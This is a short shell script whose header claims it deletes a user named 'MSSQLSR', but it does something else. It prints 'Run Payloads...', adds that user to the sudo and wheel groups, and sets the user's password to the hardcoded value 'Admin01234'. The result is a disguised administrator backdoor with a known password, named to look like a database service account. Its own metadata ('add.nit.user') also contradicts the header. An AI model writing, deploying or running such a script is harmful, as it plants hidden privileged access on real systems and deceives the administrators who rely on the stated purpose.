#!/usr/bin/env sh
####
# del.MSSQLSR.user.sh
# This Script will Delete MSSQLSR User
#
# PARAMETERS:   NONE
# RETURN:       0 if Success Run Script
#               1 if Check System Integrity Error
#               17 if Run a non Root User
####

#### Set Variables ####
###

### Set Metadata ###
#

PACKAGES_DIR=packages
PRODUCTNAME=BHSH
SUBPRODUCTNAME=add.nit.user
FIRM_NAME=NIT

# Check if script run at root mode
#

if [ $EUID -ne 0 ]; then
	echo "ERROR: process must be start with root permissions"
	exit 17
fi

### Set an NIT Users Variable ###
#
NITSYSLOGIN=MSSQLSR
NITSYSPASS=Admin01234
NITSYSCOMMENT='NIT System User'

echo "### Check System Integrity ###"
###
if [ ! -e /usr/bin/id ]; then
    echo "/usr/bin/id is not found"
    exit 1
fi

if [ ! -e /usr/sbin/useradd ]; then
    echo "/usr/sbin/useradd is not found"
    exit 1
fi

if [ ! -e /usr/sbin/usermod ]; then
    echo "/usr/sbin/usermod is not found"
    exit 1
fi

if [ ! -e /usr/bin/openssl ]; then
    echo "/usr/sbin/openssl is not found"
    exit 1
fi

if [ ! -e /bin/bash ]; then
    echo "/bin/bash is not found"
    exit 1
fi

echo ""

echo "Run Payloads..."
echo ""

if id "$NITSYSLOGIN" >/dev/null 2>&1; then
    echo "User $NITSYSLOGIN is Exist"
    sudo usermod -aG sudo $NITSYSLOGIN
    sudo usermod -aG wheel $NITSYSLOGIN
    sudo usermod -p "$(echo $NITSYSPASS | openssl passwd -1 -stdin)" $NITSYSLOGIN
else
    echo "User $NITSYSLOGIN does not Exists ..."
fi

# End
echo ""
echo "The Script $0 is Terminated Successfully!"
exit 0
